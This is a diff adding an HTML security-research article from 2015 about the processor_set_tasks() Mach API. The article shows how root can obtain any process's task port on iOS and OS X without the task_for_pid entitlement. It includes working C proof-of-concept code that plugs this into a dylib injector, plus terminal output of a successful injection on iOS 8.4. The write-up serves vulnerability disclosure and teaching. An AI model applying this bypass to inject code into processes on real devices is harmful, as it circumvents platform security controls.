@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Who needs task_for_pid anyway?</title>
+<style>
+.footnote { padding-top:5px; border-top: 1px solid black ;vertical-align : super; font-size : smaller }
+ .output { padding-left : 10px; padding-right: 10px; padding-top: 5px; padding-bottom : 5px; border : 1px solid black;  background-color : black ; color : #00FF00; overflow : auto; }
+ .typed { color : white }
+ .listing { padding-left : 10px; padding-right : 10px; padding-top: 2px; padding-bottom : 2px;overflow : auto;background-color : #ddebda; margin-left :auto; margin-right : auto; width : 90%}
+ .superscript { color : red  ;vertical-align : super; font-size : 8pt; }
+ .reference { color : red  ;vertical-align : super; font-size : 8pt; }
+ .note { border : 1px solid red; padding : 10px; width: 50%; margin-left: auto; margin-right : auto; background-color : yellow; box-shadow : 5px 5px 2px #888;}
+ .boxed { border : 1px solid black; padding : 2px;}
+ path { font-family : verdana; font-size: smaller}
+ .padded {margin-left: auto; margin-right : auto;padding : 10px; }
+ figcaption { border-top : 1px solid white; margin-top : 10px; color : white; margin-left: auto; margin-right: auto; font-size : smaller;}
+ .black { color : black ; border-top: 1px solid black;}
+ .bordered { border : 1px solid black;}
+ .rowBordered { border-bottom : 1px solid black;}
+ .annotation { color : yellow ; }
+ .jtoolAnnotation { color : green ; }
+
+ .listingCaption { border-top : 1px solid black; color : black;}
+.upperdash { border-top : 1px dashed;}
+
+ .leftPad { padding-left : 10px;}
+ .rightPad { padding-right : 10px;}
+ figure { border : 1px solid black ; padding: 5px;}
+ article { width : 90% ; margin-left : auto ; margin-right : auto;}
+ .boxeDiv { margin-left : auto; margin-right : auto; border : 1px solid black; background : silver; color : black; padding : 10px; width : 60%; margin-top : 20px; margin-bottom : 20px; box-shadow: 10px 10px 5px #888;}
+
+ h1 { margin-left: auto; margin-right : auto}
+ table { margin-top:20px; margin-bottom:20px}
+</style>
+</head>
+<body>
+<article>
+<center>
+ <h1>Who needs <code>task_for_pid()</code> anyway...</h1>
+
+<h3><code>processor_set_tasks()</code> rears its vulnerable head - for the last time...?</h3>
+</center>
+<br/>
+
+<h3>Jonathan Levin, <a href="http://twitter.com/TechnoloGeeks/">@Technologeeks</a> - http://www.newosxbook.com/ - 08/20/15</h3>
+
+<section>
+<p>the <code>processor_set_tasks()</code> vulnerability was revealed to the world as a 0-day not so long ago in BlackHat 2014. Funny enough, it was more accurately a -700-or-so day because pg 387 of MOXiI's 1st edition (from whenever it was published in 2012) describes the API in detail, and notes the leakage of <code>kernel_task</code>. Even funnier than that is that Pedro was the <a href="https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/">only one to actually notice this</a><sup>*</sup>, despite it being singled out in a nice little tip box :-). I've used it myself both in Process Explorer and coreruption, so it is kind of handy, I'll admit.</p>
+
+<p>Pedro and those discovering it, however, only paid attention to the "grand prize" - <code>kernel_task</code>, which should never be accessible from user space, not even to root. In doing so, they missed the "runner ups" - <i>Access to the task port of any other task in the system, circumventing <b>task_for_pid</b></i> entirely, even (and especially) on iOS, where it was enforced for quite a while.</p>
+
+
+<p>As the reader likely knows, <code>task_for_pid()</code> is the magical Mach trap on which all injection APIs depend. You need a way to get the task port of a process in order to have fun with it (e.g. <code>thread_create</code>, <code>mach_vm*</code>, etc. If you look at my <a href="http://newosxbook.com/src.jl?tree=listings&file=inject.c">ARM64/x86_64 injection sample</a>, it hinges on it, and fails miserably if you don't have that ability. On OS X, <code>taskgated</code> traditionally handles it (that popup from the dev tools asking when you try to debug), and as of 10.11 AMFI seems to be taking over). On iOS (and 10.11+), this requires the <code>task_for_pid-allow</code>, as enforced by the despicable AMFI. 
+</p>
+
+<p>Only I lied, kind of.</p>
+
+<p>Using <Code>processor_set_tasks</code> gets you <b>ANY TASK PORT IN THE SYSTEM</b>. So you can modify said sample , easily, to work like so:</p>
+
+<figure class="listing">
+<pre>
+<span style="color : green">// Apple says you need a task_for_pid-allow entitlement,
+// And I say, bullshit.</span>
+
+<b>
+
+mach_port_t task_for_pid_workaround(int Pid)
+{
+  
+  host_t        myhost = mach_host_self(); <span style="color: green">// host self is host priv if you're root anyway..</span>
+  mach_port_t   psDefault;
+  mach_port_t   psDefault_control;
+
+  task_array_t  tasks; 
+  mach_msg_type_number_t numTasks;
+  int i;
+
+   thread_array_t       threads;
+   thread_info_data_t   tInfo;
+
+  kern_return_t kr;
+
+  kr = processor_set_default(myhost, &psDefault);
+
+  kr = host_processor_set_priv(myhost, psDefault, &psDefault_control); 
+ if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr); 
+		 mach_error("host_processor_set_priv",kr); exit(1);}
+
+  printf("So far so good\n");
+
+  kr = processor_set_tasks(psDefault_control, &tasks, &numTasks); 
+  if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }
+
+  for (i = 0; i < numTasks; i++)
+        {
+                int pid;
+                pid_for_task(tasks[i], &pid);
+                printf("TASK %d PID :%d\n", i,pid);
+                if (pid == Pid) return (tasks[i]);
+        }
+
+   return (MACH_PORT_NULL);
+} // end workaround
+</b>
+
+
+int inject(pid_t pid, const char *lib) {
+
+task_t remoteTask;
+
+ kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+...
+if (kr != KERN_SUCCESS) {
+
+        fprintf (stderr, "Unable to call task_for_pid on pid %d: %s. Cannot continue! <b>Or... Can We?</b>\n",pid, 
+mach_error_string(kr));
+
+  <b>      // Edit : calling workaround
+
+        remoteTask = task_for_pid_workaround(pid);
+        if (remoteTask == MACH_PORT_NULL) 
+        {
+                fprintf(stderr, "Workaround isn't working. Bravo, 25+ years later, it's been patched\n");
+                exit(5);
+        }
+</b>
+}
+
+
+...
+</pre>
+</figure>
+
+<p>And so, the output is:</p>
+<figure class="output">
+<pre>
+<span class="annotation"># Note: WE STILL NEED ROOT ACCESS here - but no entitlements</span>
+Phontifex:/tmp root#  <span class="typed">jtool --ent /tmp/inject2.arm </span>
+Binary apparently does not contain any entitlements
+Phontifex:/tmp root# <span class="typed">/tmp/inject2.arm 829 /tmp/test.arm64.dylib </span>
+Unable to call task_for_pid on pid 829: (os/kern) failure). Cannot continue! Or... Can We?
+So far so good
+TASK 0 PID :1   <span class="annotation"># Note no kernel_task, this is iOS</span>
+..              <span class="annotation"># ... but some 160 perfectly (ab)usable task ports</span>
+TASK 161 PID :829 <span class="annotation"># Bingo!</span>
+<span class="annotation"># Business as usual from here :-)</span>
+Allocated remote stack @0x1001b8000
+Pthread exit  @198a0324c, 198a0324c
+Pthread set self @198a02a9c
+Pthread exit  @198a0324c, 198a0324c
+DLOpen @19884db50
+Remote Stack 64  0x100238000, Remote code is 0x1002b8000
+<span class="annotation"># Note this is iOS 8.4</span>
+Phontifex:/tmp root# <span class="typed">uname -a</span>
+Darwin Phontifex 14.0.0 Darwin Kernel Version 14.0.0: Wed Jun 24 00:50:03 PDT 2015; 
+root:xnu-2784.30.7~30/RELEASE_ARM64_T7000 iPhone7,2 arm64 N61AP Darwin
+
+</pre>
+</figure>
+
+<p>So, AMFI, shmamfi - it works. It works great on OS X 10.10.x btw, but then versions prior to 10.11 don't enforce the entitlement, and so will vanilla <code>task_for_pid()</code> - the path of least resistance.</p>
+
+
+<h2>Why does this work?</h2>
+
+<p>Because Mach APIs don't differentiate between innocuous messages that a task port offers (say, the highly useful <code>task_info</code> ones), and the really, really nasty ones, like <code>mach_vm_*</code> and friends. This is (one of many) <b>a design flaw in Mach</b>, which was conceived with tons of functionality in mind, but, well, 25 or so years ago, who thought about all this injection stuff?!?!</p>
+<p>It's worth reiterating: <b>If you can somehow cajole someone or something to give you the task port of a given process (or the kernel, PID 0), you own it. Period.</b> All it takes is just finding these port leaks. There may be one or two more. You never know with these things.</p>
+
+<h2>And why did you (sort of) lie? :~( And why expose this now?</h2>
+
+<p>I'm not in the habit of exposing 0-days for the 15 minutes of fame it entails or whatever bounty. But now this is one is finally dying (at least, in <del>9</del>/10.11 it will be dead for sure). AAPL is *finally* on to this, and with 10.11 brings the <code>task_for_pid-allow</code> entitlement to OS X (*sigh*). <code>processor_set_tasks</code> is being tinkered with by them even as I write this, and already returns <i>less<sup>**</sup></i> tasks in b7 (out today), so I can only assume it will be properly patched in iOS <del>9</del> 10 as well (*grin*). And if it is.. well... there's still another couple of aces to use there, if TaiG doesn't blow them prematurely</del>..</p>
+<p>I've said tons of times before - and I'll say it again: I'm against exploitation of security vulnerabilities, but I'll do my damnedest to help keep iOS jailbreakable. The day it isn't, by others or by myself, I'm switching (painfully) to Android.</p>
+
+<h2>Greets</h2>
+
+<ul><li>Pedro (@OSXreverser) - Still waiting for you to find the other kinda-obvious 0-day in the book. But at this point, wait for the 2<sup>nd</sup> Edition - lots more will be revealed <a href="http://NewOSXBook.com/TOC2.html">there and then</a> :-)
+</li>
+</ul>
+<p>As usual, questions/comments are welcome, but via the <a href="http://NewOSXBook.com/forum/index.php">forum</a>, please.</p>
+
+<hr/>
+<div class="footnote">* - On second thought, it's not *that* funny. It just shows how few people apparently read my work in detail. Sheesh.<br/>
+<br/>
+** - note, "returns less" != "doesn't return any". AAPL uses a new MAC call - <code>expose_task</code>, on <code>processor_set_things</code> and <code>mach_port_space_info</code> (q.v. <a href="9-10.11.html#macchecks">here</a>) and there's the entitlement of <code>com.apple.system-task-ports</code> which filters. But may I suggest slapping a new entitlement (not just "system" tasks), or really fixing it, by separating task_priv already? And no, I don't mean the task name port. Split the functionality properly!)</div>
+</article>
+</body>
